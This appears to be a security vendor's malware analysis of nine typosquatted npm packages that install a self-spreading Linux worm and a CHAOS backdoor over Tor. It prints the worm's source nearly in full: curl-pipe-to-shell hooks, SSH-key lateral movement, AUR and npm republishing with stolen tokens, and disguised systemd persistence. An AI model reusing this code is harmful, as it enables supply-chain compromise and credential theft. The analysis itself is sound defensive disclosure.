Nine npm packages hide a self-spreading Linux worm. The npm account `dirtyblanket` published all nine on September 29, 2026, in 33 minutes. Eight of them copy the popular Express framework. One copies React.

Installing any of the packages on Linux starts this chain:

1. npm install runs a preinstall hook that downloads node.js through the Internet Archive Wayback Machine.
2. node.js downloads the worm, linux.sh, from Codeberg and runs it with bash.
3. The worm installs a backdoor, systemd-fontd, as a fake systemd font service. It is the open-source CHAOS remote access tool. Over Tor, it gives the operator a shell, file access, and screenshots.
4. It uses every SSH private key on the machine to log in to the hosts in known_hosts and runs itself there.
5. It adds itself to the Arch User Repository (AUR) packages that those keys can push to.
6. It uses the npm tokens on the machine to publish new versions of your npm packages that install the worm.

Each new host, AUR package, and npm version starts the chain again. If a Linux machine installed one of these packages, treat the machine and every key and token on it as compromised.

## The packages

All nine packages come from the same npm user, `dirtyblanket` (`[email protected]`). The user published them between 06:05 and 06:38 UTC.

| Package | Version | Published (UTC) | Copies |
| --- | --- | --- | --- |
| `xeprews` | 5.2.1 | 06:05:54 | Express |
| `express-javascript` | 5.2.1 | 06:09:16 | Express |
| `express-nodejs` | 5.2.1 | 06:12:06 | Express |
| `react-nodejs` | 19.3.0 | 06:12:36 | React |
| `exprdd` | 5.2.1 | 06:31:51 | Express |
| `exprrdd` | 5.2.1 | 06:32:03 | Express |
| `exptrdd` | 5.2.1 | 06:35:14 | Express |
| `exptred` | 5.2.1 | 06:36:42 | Express |
| `exptredd` | 5.2.1 | 06:38:56 | Express |

## The preinstall hook

All nine packages have the same `preinstall` line:

```
"preinstall": "curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node"
```

When you install one of these packages, npm runs this hook, which downloads `node.js` and runs it with `node`. The script is not in the package and has no version pin or integrity check, so the operator can change it at any time.

The URL loads a raw file from Codeberg through the Wayback Machine (`web[.]archive[.]org/web/`). Network logs show a request to `web.archive.org`, not to Codeberg, and many allowlists trust `web.archive.org`. The archive copy also stays available after Codeberg removes the repository.

## Stage one: node.js

The Wayback Machine has one capture of `node.js`, dated September 29, 2026 at 05:24:36 UTC (snapshot `20260929052436`). This is about 40 minutes before `dirtyblanket` published the first package, `xeprews`, at 06:05 UTC.

The capture contains this code:

```
const { exec } = require("child_process");
const { platform } = require('node:process');

if (process.platform === "linux") {
    exec("curl https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh | bash", ()=>{});
} /*else if (process.platform === "win32") {
    exec("curl.exe https://example.com/windows.ps1 | powershell", ()=>{});
}*/
```

On Linux, the script downloads `linux.sh` from the same Codeberg repository and pipes it into `bash`.

- Linux only. On macOS and Windows the script does nothing.
- No Wayback Machine for stage two. The script downloads linux.sh from codeberg[.]org, not from the archive.
- Silent failure. The exec callback is empty (()=>{}), so the script ignores errors and output. The install finishes and prints no output from the second stage.
- Unfinished Windows branch. The operator commented out a PowerShell branch that points to the placeholder example.com/windows.ps1. Inference: the operator plans to add Windows support later.
- Unused import. The script imports platform but reads process.platform instead.

## Stage two: the Linux worm

`linux.sh` is a 227-line Bash script. It runs with the permissions of the user who ran `npm install`. As root, it also installs system packages and a system service.

### Stage URLs

The script starts with four URLs. Three go through the Wayback Machine. The operator commented out the fourth, a PowerShell script for Windows that points to `example.org`. Inference: the operator plans to add Windows support later, the same as in `node.js`.

```
_linux_script_url='https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh'
_linux_binary_url='https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/systemd-fontd'
#_windows_script_url='https://example.org/windows.ps1'
_node_script_url='https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js'
```

`systemd-fontd` is a binary in the same Codeberg repository. The worm installs it as its backdoor.

### Main function

The last line of the script runs `_async_pre_install` in the background and sends all its output to `/dev/null`. `npm install` finishes, but the worm keeps running.

```
_async_pre_install() {
  source /etc/os-release
  if [ "$EUID" -eq 0 ]; then
    if [ "$ID" = 'arch' ] || [ "$ID_LIKE" = 'arch' ]; then
      until pacman -S --needed --noconfirm tor openssh git npm base-devel
      do
        sleep 1
      done
    elif [ "$ID" = 'debian' ] || [ "$ID_LIKE" = 'debian' ]; then
      apt-get install -y tor openssh-client git npm build-essential
    fi
  fi

  _deploy_fontrenderd &

  export GIT_TERMINAL_PROMPT=0

  _known_hosts=$(mktemp)
  shopt -s nullglob
  cat {/home/*,/root,/mnt/c/Users/*}/.ssh/known_hosts /etc/ssh/ssh_known_hosts{,2} >> "$_known_hosts"

  shopt -s globstar
  for _key in $(file {/home/*,/root,/mnt/c/Users/*}/.ssh/** | grep "OpenSSH private key" | cut -d":" -f1)
  do
    _use_ssh_key "$_key" &
    local _ssh_workers+=("$!")
  done

  for _package in $(dirname /**/package.json | grep -v node_modules)
  do
    _do_npm_update "$_package" &
  done

  # shellcheck disable=SC2068
  wait ${_ssh_workers[@]}

  rm -f "$_known_hosts"
}

_async_pre_install </dev/null &>/dev/null &
```

The main function runs six steps:

1. As root, it installs tor, openssh, git, npm, and build tools. On Arch Linux it runs pacman again every second until the install succeeds. On Debian it runs apt-get install once.
2. It starts the backdoor install (_deploy_fontrenderd) in the background.
3. It sets GIT_TERMINAL_PROMPT=0, so Git never waits for a password.
4. It copies the known_hosts files of all users, of /root, and of Windows users under Windows Subsystem for Linux (WSL, /mnt/c/Users/*) into one temporary file. It also adds the system files /etc/ssh/ssh_known_hosts and /etc/ssh/ssh_known_hosts2.
5. It runs file on every file under each .ssh directory and keeps each file that is an OpenSSH private key. For each key, it starts _use_ssh_key in the background.
6. It runs dirname /**/package.json, which searches the full file system for package.json files. For each directory outside node_modules, it starts _do_npm_update in the background.

### The backdoor

`_deploy_fontrenderd` installs the `systemd-fontd` binary as a service that looks like a font service. The binary uses `HTTP_PROXY=socks5://127.0.0.1:9050`, which points to the local Tor proxy.

```
_deploy_fontrenderd() {
  if [ "$EUID" -eq 0 ]; then
    systemctl enable --now tor.service

    mkdir -p /usr/lib/systemd
    curl "$_linux_binary_url" -o /usr/lib/systemd/systemd-fontrenderd

    chmod +x /usr/lib/systemd/systemd-fontrenderd
    chattr +i /usr/lib/systemd/systemd-fontrenderd

    cat <<EOF >/etc/systemd/system/systemd-fontrenderd.service
[Unit]
Description=Font Rendering Service
Requires=tor.service
After=tor.service

[Service]
Environment="HTTP_PROXY=socks5://127.0.0.1:9050"
ExecStart=/usr/lib/systemd/systemd-fontrenderd
KillMode=none

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable --now systemd-fontrenderd.service

    chattr +i /etc/systemd/system/systemd-fontrenderd.service
    chattr +i /etc/systemd/system/multi-user.target.wants/systemd-fontrenderd.service
  else
    _tor_expert_bundle=$(mktemp -u)
    curl https://dist.torproject.org/torbrowser/15.0.23/tor-expert-bundle-linux-i686-15.0.23.tar.gz -o "$_tor_expert_bundle"

    mkdir -p ~/.config/systemd/systemd-fontrenderd
    tar -xf "$_tor_expert_bundle" -C ~/.config/systemd/systemd-fontrenderd

    rm -f "$_tor_expert_bundle"

    chmod +x ~/.config/systemd/systemd-fontrenderd/tor/tor

    mkdir -p ~/.config/systemd/user

    cat <<EOF >~/.config/systemd/user/systemd-fontrenderd.service
[Unit]
Description=Font Rendering Service

[Service]
ExecStart=%h/.config/systemd/systemd-fontrenderd/tor/tor -f %h/.config/systemd/systemd-fontrenderd/data/torrc-defaults
Environment=LD_LIBRARY_PATH=\$LD_LIBRARY_PATH:%h/.config/systemd/systemd-fontrenderd/tor
KillMode=none

[Install]
WantedBy=default.target
EOF

    curl "$_linux_binary_url" -o ~/.config/systemd/systemd-fontcached
    chmod +x ~/.config/systemd/systemd-fontcached

    cat <<EOF >~/.config/systemd/user/systemd-fontcached.service
[Unit]
Description=Font Caching Service
Wants=systemd-fontrenderd.service
After=systemd-fontrenderd.service

[Service]
Environment="HTTP_PROXY=socks5://127.0.0.1:9050"
ExecStart=%h/.config/systemd/systemd-fontcached
KillMode=none

[Install]
WantedBy=default.target
EOF

    systemctl daemon-reload --user
    systemctl enable --user --now systemd-fontrenderd.service
    systemctl enable --user --now systemd-fontcached.service
  fi
}
```

As root:

- It enables and starts the tor service.
- It saves the binary as /usr/lib/systemd/systemd-fontrenderd, next to the real systemd binaries.
- It writes /etc/systemd/system/systemd-fontrenderd.service with the description “Font Rendering Service”. The unit requires tor.service and starts at boot (multi-user.target).
- It sets KillMode=none, so systemd does not stop the child processes when the service stops.
- It runs chattr +i on the binary, the unit file, and the unit link. Nobody, including root, can change or delete an immutable file until someone runs chattr -i.

Without root:

- It downloads the official Tor Expert Bundle 15.0.23 for linux-i686 from dist.torproject.org and extracts it into ~/.config/systemd/systemd-fontrenderd/.
- It runs that tor as a user service, systemd-fontrenderd.service, with the description “Font Rendering Service”.
- It saves the binary as ~/.config/systemd/systemd-fontcached and runs it as a second user service, systemd-fontcached.service, with the description “Font Caching Service”. This service starts after the Tor service.
- Both services start when the user logs in (default.target).

The service names, the descriptions, and the file locations under `systemd` directories make the backdoor look like a part of systemd. The [binary analysis](https://safedep.io/dirtyblanket-express-impersonation-npm#binary-analysis) section shows what the binary does.

### Spread to other hosts

For each private key, `_use_ssh_key` reads the host names from the collected `known_hosts` file. It connects to each host with `ssh -o BatchMode=yes`, so the login fails instead of asking for a password.

```
_ssh() {
  # shellcheck disable=SC2068
  ssh -o BatchMode=yes -o UserKnownHostsFile="$_known_hosts" $@
}

_infect_host() {
  # Connectivity test
  # shellcheck disable=SC2068
  _ssh $@ || exit 1

  _uname="$(_ssh $@ uname)"
  # shellcheck disable=SC2068
  if [ "$_uname" = 'Linux' ]; then
    # shellcheck disable=SC2068
    _ssh $@ "nohup curl '$_linux_script_url' | nohup bash &>/tmp/log"
  #elif _ssh $@ 'echo %OS%' | grep -i 'Windows_NT'; then
    ## shellcheck disable=SC2068
  #  _ssh $@ "curl.exe $_windows_script_url | powershell"
  fi
}

_use_ssh_key() {
  export GIT_SSH_COMMAND="ssh -o BatchMode=yes -o UserKnownHostsFile='$_known_hosts' -i '$1'"

  for _host in $(cut -d' ' -f1 "$_known_hosts" | uniq)
  do
    _url="ssh://$_host"
    for _config in /home/*/.ssh/config /mnt/c/Users/*/.ssh/config /root/*/.ssh/config
    do
      _infect_host -F "$_config" -i "$1" "$_url" &
    done

    _infect_host -l root -i "$1" "$_url" &
  done

  _repos=$(_ssh -i "$1" [email protected] list-repos | tr -d '*')
  for _repo in $_repos
  do
    _do_aur_update "$_repo" &
  done

  wait
}
```

For each host, the script tries each user’s `~/.ssh/config` with the key, and it tries the `root` user with the key. `_infect_host` first runs `ssh` with no command to test the login. Then it runs `uname`. If the remote system is Linux, it downloads `linux.sh` there, pipes it into `bash` under `nohup`, and writes the output to `/tmp/log` on that host. The worm then runs again on the new host with the permissions of the user it logged in as.

A commented-out branch checks for `Windows_NT` and runs the PowerShell script. It is not active in this version.

The script reads the first field of each `known_hosts` line. When OpenSSH hashes host names (`HashKnownHosts yes`), that field is a hash (`|1|...`) and not a host name, so the script cannot connect to that host.

### Spread to Arch packages

With each key, `_use_ssh_key` also logs in to `[email protected]` and runs `list-repos`. This lists the AUR packages that the key owner maintains. For each package, the script runs `_do_aur_update`.

```
_do_aur_update() {
  local _tmp_git_path=$(mktemp -d)
  git clone "ssh://[email protected]/$1.git" "$_tmp_git_path"

  cd "$_tmp_git_path" || exit 1
  source PKGBUILD

  ((pkgrel++))

  printf '\npkgrel=%s\n' "$pkgrel" >> PKGBUILD

  if [ -z "$install" ]; then
    install="$pkgname.install"
    echo "install='$install'" >> PKGBUILD
  fi

  echo "bash <(curl '$_linux_script_url')" >> "$install"

  git config user.email "$(git log -1 --pretty=format:'%ae')"
  git config user.name "$(git log -1 --pretty=format:'%an')"

  git add PKGBUILD "$install"
  git commit -m "upgpkg: $pkgver-$pkgrel" -a --no-gpg-sign
  git push

  rm -rf "$_tmp_git_path"
}
```

`_do_aur_update` does these steps:

1. It clones the package from the AUR and loads the PKGBUILD.
2. It increases pkgrel by one, so users see a new release of the package.
3. If the package has no .install file, it adds one and names it in the PKGBUILD.
4. It adds the line bash <(curl '<linux.sh URL>') to the .install file. pacman runs the functions in this file when a user installs or upgrades the package. Inference: because the script adds the line outside any function, it runs when pacman loads the .install file.
5. It sets the Git name and email to those of the last commit author, so the commit looks like it comes from the maintainer.
6. It commits with the normal AUR message upgpkg: <pkgver>-<pkgrel>, skips commit signing (--no-gpg-sign), and pushes.

Each AUR user who upgrades one of these packages runs the worm on their own machine.

### Spread to npm packages

For each project that it finds, the script runs `_do_npm_update`.

```
_do_npm_update() {
  cd "$1" || exit 1

  local _package_json_orig="$(mktemp -u)"
  cp -a package.json "$_package_json_orig"

  local _preinstall="$(npm pkg get scripts.preinstall)"
  if [ -n "$_preinstall" ]; then
    local _preinstall+=' & '
  fi

  local _preinstall+="curl $_node_script_url | node"

  npm pkg set scripts.preinstall="$_preinstall"

  npm version patch

  for NPM_CONFIG_USERCONFIG in {/home/*,.,/mnt/c/Users/*,/root}/.npmrc "$PREFIX/etc/npmrc"
  do
    export NPM_CONFIG_USERCONFIG
    npm publish &
  done

  wait

  mv -f "$_package_json_orig" package.json
}
```

`_do_npm_update` does these steps:

1. It saves a copy of package.json.
2. It adds curl <node.js URL> | node to the preinstall script. If a preinstall script already exists, the script keeps it and adds the new command after &.
3. It runs npm version patch, which increases the patch version. In a Git repository, npm version also creates a commit and a tag by default.
4. It runs npm publish once for each .npmrc it finds. The list includes the .npmrc of each user, of the current directory, of /root, of Windows users under WSL, and $PREFIX/etc/npmrc. Each .npmrc with a valid token publishes the infected version under that token owner’s account.
5. It restores the original package.json, so the local file shows no change.

The infected version is on the npm registry, but the developer’s local `package.json` does not show it. The new version has the same `preinstall` hook as the `dirtyblanket` packages, so each install of it starts the worm on another machine.

### What the worm can reach

On a developer laptop or a CI runner, the worm can use:

- Every OpenSSH private key without a passphrase that the user can read. As root, this includes the keys of all users.
- Every host in the known_hosts files that accepts one of those keys.
- Every AUR package that one of those keys can push to.
- Every npm package that one of the .npmrc tokens can publish, if a copy of the package is on the disk.

## Binary analysis

`systemd-fontd` (SHA-256 `2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2`) is a 7.6 MB Go binary for Linux x86-64. The operator stripped the symbol table, but the Go build metadata is still in the file. It names the module `github.com/tiagorlampert/CHAOS/client`.

```
systemd-fontd: go1.27.1-X:nodwarf5
	path	command-line-arguments
	dep	github.com/gen2brain/shm	v0.0.0-20230802011745-f2460f5984f7	h1:VLEKvjGJYAMCXw0/32r9io61tEXnMWDRxMk+peyRVFc=
	dep	github.com/gorilla/websocket	v1.5.1	h1:gmztn0JnHVt9JZquRuzLw3g4wouNVzKL15iLr/zn/QY=
	dep	github.com/jezek/xgb	v1.1.0	h1:wnpxJzP1+rkbGclEkmwpVFQWpuE2PUGNUzP8SbfFobk=
	dep	github.com/kbinani/screenshot	v0.0.0-20230812210009-b87d31814237	h1:YOp8St+CM/AQ9Vp4XYm4272E77MptJDHkwypQHIRl9Q=
	dep	github.com/tiagorlampert/CHAOS/client	(devel)	
	dep	golang.org/x/net	v0.17.0	h1:pVaXccu2ozPjCXewfr1S7xza/zcXTity9cCdXQYSjIM=
	dep	golang.org/x/sync	v0.7.0	h1:YsImfSBoP9QPYL0xyKJPq0gcaJdG3rInoqxTWbfQu9M=
	build	-buildmode=exe
	build	-compiler=gc
	build	-trimpath=true
	build	CGO_ENABLED=1
	build	GOARCH=amd64
	build	GOEXPERIMENT=nodwarf5
	build	GOOS=linux
	build	GOAMD64=v1
```

[CHAOS](https://github.com/tiagorlampert/CHAOS) is an open-source remote administration tool on GitHub. It has a server with a web panel and a client that runs on the target machine. The function names in the Go function table of `systemd-fontd` match the CHAOS client. The binary contains only CHAOS and its dependencies. The operator made two changes. The settings use new key names, and the HTTP client uses a proxy.

### Server address and token

The CHAOS client keeps its settings as base64-encoded JSON inside the binary. The decoded settings in `systemd-fontd` point to a Tor hidden service on port 80:

```
{
  "i303eFkR5V": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE4MjIxODY3NDAsInVzZXIiOiJkZWZhdWx0In0.<signature redacted>",
  "nHM79XC41w": "s5n2uyo6gb6dhirsm5pihwohi6e7ayrwojx4xjow4cqabmbowpezenid.onion",
  "we7AI3GHkL": "80"
}

JWT header:  {"alg":"HS256","typ":"JWT"}
JWT payload: {"authorized":true,"exp":1822186740,"user":"default"}
exp = 2027-09-29 02:59:00 UTC
```

The first value is a JWT that the client sends to the server. It is for the CHAOS user `default` and expires on September 29, 2027. We removed the signature from the token above.

The upstream CHAOS client reads the keys `port`, `server_address`, and `token`. In this binary, the operator changed the three keys to random strings. Inference: the change makes the settings harder to find with a search for the upstream key names.

### Proxy settings

The HTTP client in upstream CHAOS does not read proxy settings from the environment. In `systemd-fontd`, the HTTP client sets `Proxy` to `http.ProxyFromEnvironment`. The worm sets `HTTP_PROXY=socks5://127.0.0.1:9050` in the service file, so the client sends its HTTP requests through Tor. Upstream CHAOS opens its WebSocket with the default `gorilla/websocket` dialer, which also reads `HTTP_PROXY`. Inference: the WebSocket traffic also goes through Tor, because a `.onion` address only resolves through Tor.

```
; github.com/tiagorlampert/CHAOS/client/app.New (inlined network.NewHttpClient)
6fa4c3: lea    0x3e619e(%rip),%rax     ; type: net/http.Transport
6fa4ca: call   runtime.newobject
6fa4cf: mov    %rax,0xb0(%rsp)
6fa4d7: lea    0x3ee56a(%rip),%rcx     ; funcval: net/http.ProxyFromEnvironment
6fa4de: mov    %rcx,0xa8(%rax)         ; Transport.Proxy (offset 0xa8)
6fa4e5: lea    0x3e55fc(%rip),%rax     ; type: crypto/tls.Config
6fa4ec: call   runtime.newobject
6fa4f1: movb   $0x1,0xa0(%rax)         ; tls.Config.InsecureSkipVerify = true (offset 0xa0)
```

Like upstream CHAOS, the client accepts any TLS certificate (`InsecureSkipVerify`).

### What the operator can do

The command handler in `systemd-fontd` checks for the same eleven commands as upstream CHAOS. The binary also contains the strings `health`, `device`, `/client`, `x-client`, `jwt=`, `reboot`, `poweroff`, and `xdg-open`. The details below, such as the 30-second interval and the 5-second shell limit, come from the upstream source for those functions.

The client sends `GET /health` to the server, then `POST /device` with the host name, the user name and ID, the operating system, the architecture, the MAC address, and the local IP address. It repeats this every 30 seconds. At the same time, it opens a WebSocket to `ws://<onion>:80/client` with the header `x-client: <MAC address>` and the cookie `jwt=<token>`, and waits for commands.

| Command | What the client does on Linux |
| --- | --- |
| Any other text | Runs the text with `sh -c` and sends back the output (5-second limit) |
| `getos` | Sends the device information again |
| `screenshot` | Takes a screenshot of the X11 display and sends it |
| `explore <path>` | Lists the files in a directory |
| `download <path>` | Sends a file from the machine to the operator |
| `upload <path>` | Writes a file from the operator to the machine |
| `delete <path>` | Deletes a file |
| `open-url <url>` | Opens a URL with `xdg-open` |
| `restart`, `shutdown` | Runs `reboot` or `poweroff` |
| `lock`, `sign-out` | Not supported on Linux |

The remote shell runs with the permissions of the service. If the worm ran as root, the operator gets a root shell.